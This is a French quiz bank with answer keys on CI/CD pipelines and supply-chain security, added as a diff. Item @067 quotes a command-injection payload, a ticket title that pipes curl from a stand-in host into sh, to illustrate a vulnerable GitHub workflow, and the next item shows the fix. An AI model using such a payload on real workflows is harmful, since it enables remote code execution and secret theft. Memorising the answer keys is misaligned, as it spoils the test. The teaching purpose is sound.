@@ -1,0 +1,467 @@
+@051
+Q: Que permet ce déclencheur de workflow ?
+C: Lancer le workflow à la main en choisissant l'environnement
+W: Lancer le workflow à chaque création de nouvelle branche
+W: Déployer automatiquement en recette, puis en production
+W: Suspendre le workflow tant que l'environnement n'est pas codé
+E: workflow_dispatch ajoute un bouton « Run workflow » dans l'onglet Actions, avec un formulaire construit à partir des inputs. La valeur se lit par ${{ inputs.environnement }}. Les droits restent ceux de la personne qui lance.
+```yaml
+on:
+  workflow_dispatch:
+    inputs:
+      environnement:
+        type: choice
+        options: [recette, production]
+```
+
+@052
+Q: Avec ce réglage, que se passe-t-il si deux pushs arrivent sur la même branche à une minute d'intervalle ?
+C: Le run en cours est annulé, seul le second continue
+W: Les deux runs s'exécutent en parallèle sur deux runners
+W: Le second attend la fin du premier, puis s'exécute
+W: Le second est ignoré tant que le premier n'a pas fini
+E: Le groupe de concurrence est propre à la branche. cancel-in-progress annule le run devenu inutile, ce qui économise des minutes. Sans cette option, le second attendrait : c'est préférable pour un déploiement qu'on ne veut pas couper en plein milieu.
+```yaml
+concurrency:
+  group: deploy-${{ github.ref }}
+  cancel-in-progress: true
+```
+
+@053
+Q: Compléter la règle pour ne déployer en recette que depuis la branche main.
+A: main
+E: Une règle rules évaluée à vrai ajoute le job au pipeline ; si aucune règle ne correspond, le job est absent. CI_COMMIT_BRANCH n'existe pas dans un pipeline de merge request, ce qui exclut aussi ces pipelines.
+```yaml
+deploy-recette:
+  stage: deploy
+  script: ./deploy.sh recette
+  rules:
+    - if: $CI_COMMIT_BRANCH == "____"
+```
+
+@054
+Q: Quel tag donner à l'image construite par la CI pour la retrouver sans ambiguïté ?
+C: Le SHA du commit qui a produit l'image
+W: latest, mis à jour à chaque nouveau build
+W: Le nom de la branche, réécrit à chaque push
+W: La date du jour, avec une seule image par jour
+E: Un tag lié au commit relie l'image au code source et ne bouge jamais. latest ou un nom de branche changent de contenu sans prévenir : deux serveurs peuvent alors exécuter deux versions différentes sous le même nom.
+
+@055
+Q: À quoi servent Nexus ou Artifactory dans une chaîne CI/CD ?
+C: Stocker et distribuer les artefacts versionnés et les dépendances
+W: Exécuter les jobs du pipeline sur des machines dédiées
+W: Héberger le code source et les merge requests de l'équipe
+W: Superviser les applications une fois en production
+E: Le dépôt d'artefacts garde chaque version publiée et sert aussi de miroir aux registres publics (Maven Central, npm, PyPI). Les builds continuent si un registre externe tombe et les paquets utilisés restent identiques.
+
+@056
+Q: Associer chaque élément d'un Jenkinsfile déclaratif à son rôle.
+P: agent => Choisit la machine qui exécute le pipeline
+P: stage => Regroupe des étapes sous un nom affiché
+P: post => Lance des actions selon le résultat final
+P: when => Saute le stage si sa condition est fausse
+E: agent peut aussi se placer dans un stage pour l'exécuter ailleurs, par exemple dans un conteneur. when accepte branch, environment ou expression ; un stage sauté apparaît grisé dans la vue du pipeline.
+
+@057
+Q: Dans cet extrait, pourquoi la commande sh est-elle entre apostrophes simples plutôt qu'entre guillemets doubles avec ${JETON} ?
+C: Le shell lit la variable : sa valeur n'entre pas dans le script Groovy
+W: Groovy refuse les guillemets doubles dans une étape sh
+W: Les apostrophes chiffrent la valeur avant l'envoi au registre
+W: Les guillemets empêcheraient docker login de lire l'entrée standard
+E: Entre guillemets doubles, Groovy remplacerait ${JETON} avant l'exécution : la valeur se retrouverait dans la ligne de commande, visible des autres processus, et Jenkins signale ce cas. Entre apostrophes, seul le shell la lit, depuis son environnement.
+```groovy
+withCredentials([string(credentialsId: 'registre-ci', variable: 'JETON')]) {
+    sh 'echo "$JETON" | docker login -u ci --password-stdin registre.exemple.fr'
+}
+```
+
+@058
+Q: Sans cache, un build dure 9 min, dont 6 min de téléchargement des dépendances. Le cache est valide pour 80 % des builds et sa restauration prend 1 min. Quelle est la durée moyenne d'un build ?
+N: 5
+U: min
+E: Avec cache : 9 - 6 + 1 = 4 min. Moyenne : 0,8 × 4 + 0,2 × 9 = 3,2 + 1,8 = 5 min. Améliorer le taux de réussite du cache rapporte souvent plus que réduire le temps de restauration.
+
+@059
+Q: L'équipe fixe un seuil de couverture de 80 % qui fait échouer le pipeline. Quelle limite garder en tête ?
+C: Un code couvert n'est pas forcément vérifié par des assertions
+W: La couverture ne mesure que les tests de bout en bout
+W: Au-delà de 80 %, l'instrumentation ralentit l'application en production
+W: Le seuil empêche d'ajouter de nouveaux tests au projet
+E: Un test sans assertion exécute des lignes et fait monter le chiffre sans rien vérifier. Le seuil évite une baisse, mais la qualité se juge en relecture ; le test de mutation mesure mieux la force des tests.
+
+@060
+Q: Quel est le principe du GitOps, par exemple avec Argo CD ?
+C: L'état voulu est dans Git ; un agent du cluster l'applique et corrige les écarts
+W: Le pipeline CI se connecte au cluster et lance kubectl apply à chaque build
+W: Les équipes modifient le cluster à la main, puis commitent le résultat
+W: Git remplace le registre d'images pour stocker les conteneurs
+E: Le cluster tire sa configuration au lieu que la CI la pousse : la CI n'a plus besoin d'identifiants sur le cluster. Chaque changement est un commit, donc relu et réversible par git revert.
+
+@061
+Q: Remettre dans l'ordre la publication d'une version à partir d'un tag.
+O: Fusionner la merge request dans main
+O: Créer le tag v2.4.0 sur le commit validé
+O: Laisser le pipeline du tag construire et publier l'artefact 2.4.0
+O: Déployer l'artefact 2.4.0 en production
+E: Le tag fige le commit exact de la version ; le pipeline déclenché par le tag produit l'artefact qui porte ce numéro. Un tag de version ne se déplace jamais : une correction donne v2.4.1.
+
+@062
+Q: Associer chaque message de commit conventionnel à la version publiée par semantic-release.
+P: fix: corrige l'arrondi des totaux => 1.4.2 devient 1.4.3
+P: feat: ajoute l'export CSV => 1.4.2 devient 1.5.0
+P: feat!: supprime l'ancienne API => 1.4.2 devient 2.0.0
+P: docs: précise l'installation => Aucune nouvelle version publiée
+E: Les Conventional Commits rendent la version calculable : fix donne un correctif, feat une mineure, un point d'exclamation ou BREAKING CHANGE une majeure. L'outil génère aussi les notes de version à partir des mêmes messages.
+
+@063
+Q: Que fait Dependabot, ou Renovate, dans un dépôt ?
+C: Il ouvre des pull requests qui mettent à jour les dépendances
+W: Il réécrit le code qui appelle une API dépréciée
+W: Il bloque tout build tant qu'une dépendance est en retard
+W: Il installe les correctifs directement sur les serveurs
+E: Chaque mise à jour passe par le pipeline comme n'importe quelle modification. De petites montées régulières se fusionnent facilement ; laisser filer deux ans de versions rend la mise à jour longue et risquée.
+
+@064
+Q: Associer chaque analyse de sécurité du pipeline à ce qu'elle examine.
+P: SAST => Le code source, sans l'exécuter
+P: SCA => Les dépendances et leurs failles connues
+P: DAST => L'application en cours d'exécution
+P: Détection de secrets => Les clés commitées par erreur
+E: Ces analyses se complètent : le SAST voit une injection SQL dans le code, le SCA une bibliothèque vulnérable, le DAST un en-tête manquant sur l'application déployée. La détection de secrets (gitleaks, trufflehog) tourne aussi avant le commit.
+
+@065
+Q: Comment se comporte ce job dans le pipeline de main ?
+C: Il attend qu'une personne autorisée le lance d'un clic
+W: Il se lance seul après la réussite du stage précédent
+W: Il est ignoré tant que la variable production n'existe pas
+W: Il se lance une fois par jour à une heure fixe
+E: when: manual laisse le job en attente avec un bouton de lecture. Combiné à un environnement protégé, seules les personnes autorisées peuvent le déclencher. environment relie aussi le job à l'historique des déploiements de production.
+```yaml
+deploy-production:
+  stage: deploy
+  script: ./deploy.sh production
+  environment: production
+  when: manual
+```
+
+@066
+Q: Pour déployer sur AWS depuis GitHub Actions, pourquoi préférer OIDC à des clés d'accès gardées en secrets ?
+C: Le job obtient des droits temporaires, sans clé durable stockée
+W: OIDC chiffre le code source avant son envoi vers AWS
+W: Les secrets GitHub ne peuvent pas contenir de clés AWS
+W: OIDC dispense de définir des droits IAM sur le compte
+E: GitHub émet un jeton signé décrivant le dépôt, la branche et l'environnement ; AWS l'échange contre des droits d'une heure si la condition du rôle correspond. Une fuite ne donne rien de réutilisable, et aucune clé n'est à renouveler.
+
+@067
+Q: Quel risque présente l'étape de ce workflow ?
+C: Un titre de ticket piégé peut injecter des commandes shell
+W: Le titre du ticket apparaît en clair dans les journaux publics
+W: Le job échoue dès que le titre contient des accents
+W: Le ticket est fermé dès que le job se termine
+E: L'expression ${{ }} est remplacée avant que le shell lise la ligne. Un titre comme a"; curl pirate.example/x | sh; echo " devient du code exécuté avec le jeton du job. Le titre doit passer par une variable d'environnement.
+```yaml
+on: issues
+jobs:
+  trier:
+    runs-on: ubuntu-latest
+    steps:
+      - run: echo "Nouveau ticket : ${{ github.event.issue.title }}"
+```
+
+@068
+Q: Compléter la version corrigée de l'étape, qui passe le titre du ticket par une variable d'environnement.
+A: TITRE
+E: Le titre est copié dans l'environnement du processus, puis lu par le shell comme une simple donnée entre guillemets. Aucune substitution ne se fait dans le texte du script, donc rien n'est interprété comme une commande.
+```yaml
+      - env:
+          TITRE: ${{ github.event.issue.title }}
+        run: echo "Nouveau ticket : $____"
+```
+
+@069
+Q: Pourquoi un workflow pull_request_target qui récupère puis construit le code de la pull request est-il dangereux ?
+C: Le code d'un fork s'exécute avec les secrets et un jeton en écriture
+W: Le workflow ne se déclenche pas pour une pull request venue d'un fork extérieur
+W: La pull request est fusionnée automatiquement après le build
+W: Le build se fait sur la branche cible, sans le code proposé
+E: pull_request_target s'exécute dans le contexte de la branche cible, avec ses secrets, pour pouvoir commenter ou étiqueter. Construire le code proposé lui donne ces droits : un script de build modifié suffit à voler les secrets.
+
+@070
+Q: Pourquoi des équipes remplacent-elles @v2 par le SHA complet du commit de l'action ?
+C: Un tag peut être redirigé ; un SHA complet ne bouge pas
+W: Le SHA rend le téléchargement de l'action plus rapide
+W: Les tags de version sont refusés sur les runners auto-hébergés
+W: Le SHA met l'action à jour toute seule à chaque version
+E: En mars 2025, les tags de l'action tj-actions/changed-files ont été redirigés vers un commit qui affichait les secrets dans les journaux de milliers de dépôts. Un SHA complet fige le code ; Dependabot sait proposer les nouvelles versions épinglées.
+```yaml
+- uses: tierce/deploy-action@v2
+```
+
+@071
+Q: Pourquoi déconseille-t-on un runner auto-hébergé persistant sur un dépôt public ?
+C: Le code d'un inconnu s'y exécute et peut y rester
+W: Un runner auto-hébergé ne sait pas exécuter de conteneurs
+W: Un runner auto-hébergé ne peut pas accéder à Internet
+W: Les journaux d'un runner auto-hébergé restent invisibles
+E: Le code proposé s'exécute sur la machine, souvent dans le réseau interne. Un processus laissé en arrière-plan peut lire les jobs suivants, secrets compris. On réserve ces runners aux dépôts privés ou on les recrée à chaque job.
+
+@072
+Q: Associer chaque mécanisme de réutilisation à ce qu'il partage.
+P: Workflow réutilisable GitHub => Des jobs entiers, avec leurs runners
+P: Action composite GitHub => Une suite d'étapes au sein d'un job
+P: include de GitLab => Un fichier YAML venu d'un autre projet
+P: Bibliothèque partagée Jenkins => Des fonctions Groovy communes aux Jenkinsfile
+E: Centraliser le pipeline évite de corriger vingt copies divergentes. On versionne ces modèles comme du code, et chaque projet référence une version précise pour ne pas casser à chaque changement.
+
+@073
+Q: Dans ce fichier GitLab, pourquoi le nom .tests-base commence-t-il par un point ?
+C: C'est un job caché : un modèle jamais exécuté seul
+W: Le point rend ce job prioritaire sur tous les autres
+W: Le point exécute le job avant tous les stages
+W: Un job dont le nom a un point tourne sur un runner dédié
+E: GitLab n'ajoute pas au pipeline les jobs dont le nom commence par un point. extends fusionne le modèle dans le job, qui peut redéfinir une clé ; les ancres YAML font la même chose de façon moins lisible.
+```yaml
+.tests-base:
+  image: python:3.12
+  before_script:
+    - pip install -r requirements.txt
+
+tests-unitaires:
+  extends: .tests-base
+  script:
+    - pytest tests/unit
+```
+
+@074
+Q: Avec ces dépendances entre jobs et des runners en nombre suffisant, quelle est la durée minimale du pipeline ?
+N: 15
+U: min
+E: Deux chemins mènent à deploy : build, test-unit, package (3 + 5 + 2 = 10 min) et build, test-api (3 + 8 = 11 min). deploy démarre à 11 min et finit à 15 min. Seul le chemin le plus long, par test-api, vaut la peine d'être raccourci.
+```text
+build        3 min
+test-unit    5 min   needs: build
+test-api     8 min   needs: build
+package      2 min   needs: test-unit
+deploy       4 min   needs: package, test-api
+```
+
+@075
+Q: Deux pull requests passent la CI chacune de leur côté, mais main casse après leurs deux fusions. Quel mécanisme évite ce cas ?
+C: Une file de fusion qui teste les PR à la suite
+W: Relancer la CI de chaque pull request d'heure en heure
+W: Exiger deux relecteurs pour chaque pull request
+W: Interdire la fusion de deux pull requests le même jour
+E: Chaque PR a été testée sur un main qui ne contenait pas l'autre. La merge queue de GitHub, ou les merge trains de GitLab, testent le résultat réel de la fusion dans l'ordre d'arrivée avant de l'appliquer.
+
+@076
+Q: Quel risque garder en tête avec ce filtre dans un monorepo ?
+C: Un changement de code partagé ne relance pas ces tests
+W: Le workflow se lance pour toute modification du dépôt
+W: Le filtre empêche toute fusion sur la branche main
+W: Les fichiers hors du dossier sont retirés du checkout du job
+E: Le filtre ne connaît que des chemins, pas les dépendances. On ajoute les dossiers partagés au filtre, ou on utilise un outil qui calcule les projets touchés à partir du graphe de dépendances (Nx, Bazel, Gradle).
+```yaml
+on:
+  push:
+    paths:
+      - "services/facturation/**"
+```
+
+@077
+Q: Pourquoi ce Dockerfile réinstalle-t-il toutes les dépendances à chaque build de la CI ?
+C: COPY . . change à chaque commit et invalide la couche pip
+W: L'image python:3.12-slim interdit la mise en cache des couches
+W: WORKDIR vide le cache de construction à chaque build
+W: pip install ignore le cache de Docker par défaut
+E: Une couche est réutilisée tant que ses entrées sont identiques ; dès qu'une couche change, toutes les suivantes sont refaites. On copie d'abord requirements.txt, on installe, puis on copie le reste du code.
+```dockerfile
+FROM python:3.12-slim
+WORKDIR /app
+COPY . .
+RUN pip install -r requirements.txt
+```
+
+@078
+Q: Remettre dans l'ordre les étapes d'une chaîne d'approvisionnement logicielle contrôlée.
+O: Construire l'image dans la CI
+O: Générer son SBOM et l'analyser
+O: Signer l'image avec cosign
+O: Vérifier la signature au déploiement dans le cluster
+E: La signature porte sur l'image déjà analysée. Le contrôleur d'admission du cluster (Kyverno, policy-controller) refuse une image non signée ou signée par un autre pipeline, même poussée à la main dans le registre.
+
+@079
+Q: Qu'apporte un SBOM publié avec chaque image ?
+C: L'inventaire de ses composants et de leurs versions
+W: La preuve que l'image est exempte de vulnérabilités
+W: La liste des personnes qui ont relu le code de l'image
+W: Le chiffrement de chaque couche de l'image publiée
+E: Quand une faille comme Log4Shell est publiée, il suffit de chercher le composant dans les SBOM au lieu d'inspecter chaque image. Le SBOM (SPDX ou CycloneDX) ne juge rien : il liste.
+
+@080
+Q: Pourquoi utiliser des runners éphémères, recréés pour chaque job ?
+C: Aucun reste d'un job ne peut fausser ou compromettre le suivant
+W: Ils gardent le cache sur disque, d'un job au suivant
+W: Ils dispensent d'écrire les scripts d'installation
+W: Ils conservent les secrets d'un job pour les jobs suivants
+E: Un runner réutilisé accumule fichiers, processus et outils installés : un build peut réussir grâce à un reste du précédent, ou un job malveillant peut piéger le suivant. Le cache passe alors par un stockage explicite.
+
+@081
+Q: Pourquoi un workflow lancé par des pull requests externes ne doit-il pas écrire dans le cache des builds de release ?
+C: Une dépendance piégée y serait reprise par la release
+W: Le cache deviendrait trop volumineux pour le disque du runner
+W: Les pull requests externes n'ont pas d'accès au réseau
+W: Le cache des releases est en lecture seule par défaut
+E: Le cache n'est pas vérifié comme le code : un fichier qui y entre est réutilisé tel quel. GitHub isole les caches par branche, mais pull_request_target ou un workflow mal découpé peuvent écrire dans le cache de la branche principale.
+
+@082
+Q: Compléter ce stage Jenkins pour exécuter les deux suites de tests en même temps.
+A: parallel
+E: Les stages imbriqués dans parallel démarrent ensemble, sur le même agent ou chacun sur le sien. failFast true arrête les autres branches dès qu'une échoue.
+```groovy
+stage('Tests') {
+    ____ {
+        stage('Unitaires') { steps { sh 'mvn test' } }
+        stage('Intégration') { steps { sh 'mvn verify -Pit' } }
+    }
+}
+```
+
+@083
+Q: Dans une matrice GitHub Actions, que change fail-fast: false ?
+C: Les autres combinaisons continuent quand l'une échoue
+W: Le job s'arrête dès la première étape en échec
+W: Les combinaisons s'exécutent l'une après l'autre
+W: Une combinaison en échec est relancée automatiquement
+E: Par défaut, un échec annule les combinaisons encore en cours. Avec false, on voit d'un coup si le problème touche une seule version de Python ou toutes, ce qui aide au diagnostic.
+
+@084
+Q: Associer chaque option d'une variable CI/CD GitLab à son effet.
+P: Protégée => Disponible seulement sur les branches et tags protégés
+P: Masquée => Remplacée par [MASKED] dans les journaux
+P: De type fichier => Écrite dans un fichier dont le chemin est fourni
+P: Limitée à un environnement => Réservée aux jobs de cet environnement
+E: Une variable de production protégée et limitée à l'environnement production n'est pas lisible depuis une branche de travail. Le masquage ne protège que l'affichage : un script peut toujours envoyer la valeur ailleurs.
+
+@085
+Q: Pourquoi un retour arrière du code peut-il échouer après une migration de base de données ?
+C: L'ancienne version ne sait pas lire le schéma déjà modifié
+W: Le retour arrière supprime automatiquement la base de données
+W: Une migration interdit de redéployer un artefact déjà utilisé
+W: Le registre efface les anciennes versions à chaque déploiement
+E: Si la migration a supprimé ou renommé une colonne, l'ancien code plante dès sa première requête. D'où les migrations en deux temps : élargir le schéma, déployer, puis nettoyer une fois la nouvelle version confirmée.
+
+@086
+Q: Sur un trimestre, une équipe a fait 40 mises en production, dont 6 ont provoqué un incident ou un retour arrière. Quel est son taux d'échec des changements ?
+N: 15
+U: %
+E: 6 / 40 = 0,15, soit 15 %. Le chiffre se lit avec la fréquence de déploiement : un taux bas obtenu en déployant une fois par mois cache souvent de gros lots difficiles à diagnostiquer.
+
+@087
+Q: Cinq changements ont mis 2 h, 70 h, 5 h, 3 h et 26 h entre leur commit et la production. Quelle est la médiane du délai des changements ?
+N: 5
+U: h
+E: Rangés : 2, 3, 5, 26, 70 ; la valeur centrale est 5 h. La moyenne (21,2 h) est tirée par un seul changement resté bloqué. Ce cas mérite pourtant d'être analysé : relecture en attente, recette manuelle ?
+
+@088
+Q: Que prouve une attestation de provenance SLSA attachée à un artefact ?
+C: Quel pipeline l'a construit, et depuis quel commit
+W: Que l'artefact est exempt de vulnérabilité connue
+W: Que deux développeurs ont relu le code de l'artefact
+W: Que l'artefact passera les tests une fois en production
+E: L'attestation est signée par la plateforme de build : on peut vérifier qu'une image vient bien du dépôt et du workflow attendus, et non d'un poste de développeur. Elle ne dit rien de la qualité du code.
+
+@089
+Q: Avec la signature sans clé de Sigstore (cosign keyless) dans la CI, sur quoi repose la confiance ?
+C: Sur l'identité OIDC du workflow, notée dans un journal public
+W: Sur une clé privée rangée dans les secrets du dépôt
+W: Sur l'adresse IP du runner qui a signé l'image
+W: Sur le tag de l'image, contrôlé par le registre
+E: Fulcio délivre un certificat de quelques minutes lié à l'identité du workflow, et la signature est inscrite dans le journal Rekor. À la vérification, on exige une identité précise : tel dépôt, tel workflow, telle branche.
+
+@090
+Q: Le paquet interne « acme-outils » est résolu depuis le registre public, où un inconnu a publié une version 99.0.0. Quelle parade appliquer ?
+C: Résoudre les noms internes seulement via le registre privé, sous un espace réservé
+W: Toujours retenir la version la plus haute disponible au moment du build
+W: Ajouter un test unitaire qui importe le paquet et contrôle le numéro de sa version
+W: Vider le cache du runner avant chaque build de l'application
+E: C'est la confusion de dépendances : le gestionnaire choisit la version la plus haute, donc celle de l'attaquant. Un scope npm réservé, un dépôt virtuel qui sert les noms internes en priorité et un fichier de verrou avec empreintes ferment cette porte.
+
+@091
+Q: Deux builds du même commit produisent des JAR aux empreintes différentes. Quelle cause est fréquente ?
+C: Des horodatages dans l'archive et des versions de dépendances flottantes
+W: Les runners utilisent des processeurs de marques et de générations différentes
+W: Le SHA du commit change à chaque nouveau checkout
+W: La compression ZIP mélange au hasard l'ordre des entrées de l'archive
+E: Un build reproductible fixe les dates des fichiers (project.build.outputTimestamp avec Maven), l'ordre des entrées et les versions exactes. On peut alors reconstruire et comparer pour vérifier qu'un artefact vient bien du code annoncé.
+
+@092
+Q: Avec Argo Rollouts et une AnalysisTemplate, qu'est-ce qui décide du passage au palier suivant d'un canary ?
+C: Une requête de métriques comparée à un seuil, à chaque palier
+W: Le développeur qui a fusionné, d'un clic dans GitHub
+W: Le nombre de pods prêts, sans regarder les métriques
+W: Un délai fixe, au bout duquel le rollout avance sans condition
+E: L'analyse interroge par exemple Prometheus sur le taux d'erreurs de la nouvelle version. Au-delà du seuil, le rollout est annulé et le trafic revient seul à l'ancienne version, sans attendre qu'une personne regarde un tableau de bord.
+
+@093
+Q: Le budget d'erreur du SLO mensuel est épuisé au 18 du mois. Quelle politique applique-t-on souvent au pipeline ?
+C: Geler les livraisons non urgentes, priorité à la fiabilité
+W: Déployer plus souvent pour livrer les corrections plus vite
+W: Suspendre le SLO jusqu'au début du mois suivant
+W: Déployer sans tests pour rattraper le retard pris
+E: Le budget d'erreur arbitre entre vitesse et stabilité : tant qu'il reste du budget, on livre ; épuisé, on consacre l'effort aux causes des incidents. La règle est convenue à l'avance avec le produit, ce qui évite le débat pendant la crise.
+
+@094
+Q: Un service a un SLO de disponibilité de 99,9 % sur 30 jours. Combien de minutes d'indisponibilité son budget d'erreur autorise-t-il ?
+N: 43,2
+U: min
+T: 1
+E: 30 jours font 43 200 minutes ; 0,1 % de 43 200 donne 43,2 minutes. Un déploiement qui coupe le service cinq minutes en consomme déjà plus d'un dixième : d'où l'intérêt des déploiements sans interruption.
+
+@095
+Q: Remettre dans l'ordre l'application de ces ressources par Argo CD, selon leur sync wave.
+O: Vague -1 : Job de migration de la base
+O: Vague 0 : ConfigMap de l'application
+O: Vague 1 : Deployment de la nouvelle version
+O: Vague 2 : Job de tests de fumée
+E: Argo CD applique les vagues par numéro croissant et attend que chacune soit saine avant la suivante. Le code ne démarre donc jamais avant la migration ni sans sa configuration.
+
+@096
+Q: Avec Argo CD réglé en selfHeal, un opérateur change à la main le nombre de réplicas en production. Que se passe-t-il ?
+C: Argo CD rétablit la valeur décrite dans Git
+W: Argo CD commite la nouvelle valeur dans Git
+W: La modification tient jusqu'au prochain commit
+W: Argo CD supprime l'application puis la recrée
+E: L'écart entre le cluster et Git est une dérive, corrigée en quelques secondes. Pour changer durablement les réplicas, on passe par un commit. Un HorizontalPodAutoscaler se déclare à part, sinon les deux se battent.
+
+@097
+Q: Un secret masqué dans les journaux apparaît pourtant après l'étape echo $SECRET | base64. Pourquoi ?
+C: Le masquage cherche la valeur exacte, pas sa forme encodée
+W: base64 déchiffre le secret avant de l'afficher
+W: Le masquage ne s'applique qu'aux jobs de déploiement
+W: Le masquage est coupé sur les runners hébergés
+E: Le runner remplace dans la sortie les chaînes identiques aux secrets connus. Encodé, découpé ou inversé, le secret n'est plus reconnu. Le masquage protège d'un affichage accidentel, pas d'un script qui veut l'exfiltrer.
+
+@098
+Q: Pourquoi un cache de build distant (Bazel, Gradle) exige-t-il des actions hermétiques ?
+C: Une entrée non déclarée fausse la clé du cache
+W: Le cache distant n'accepte que des fichiers signés par le runner
+W: Le cache distant ne marche que sur un runner privé de réseau
+W: Le compilateur refuse toute action qui n'est pas hermétique
+E: Si une étape lit une variable d'environnement ou un outil installé non déclaré, deux machines calculent la même clé pour deux résultats différents. Le cache partage alors le mauvais résultat avec toute l'équipe.
+
+@099
+Q: Associer chaque stratégie de déploiement à son compromis.
+P: Blue-green => Bascule immédiate, mais capacité doublée
+P: Canary => Risque limité à une part du trafic, mesures indispensables
+P: Rolling update => Pas de capacité en plus, versions mélangées un moment
+P: Recreate => Très simple, mais service coupé pendant le remplacement
+E: Recreate convient à un outil interne qui accepte une coupure ou à une application qui ne supporte pas deux versions en même temps. Les autres demandent une compatibilité entre versions, notamment du schéma de base.
+
+@100
+Q: Une équipe livre une fois par mois de gros lots et subit beaucoup d'incidents. Selon les recherches DORA, quel levier essayer d'abord ?
+C: Des changements plus petits et plus fréquents, vérifiés par le pipeline
+W: Des mises en production plus rares, pour mieux tester chaque version
+W: Une phase de recette manuelle de deux semaines avant chaque livraison
+W: Un comité d'approbation externe pour valider chaque changement
+E: Un petit changement se relit, se teste et se défait facilement ; un incident se rattache vite à sa cause. Les études DORA n'ont trouvé aucun lien entre comité d'approbation externe et stabilité, mais un lien avec des livraisons plus lentes.
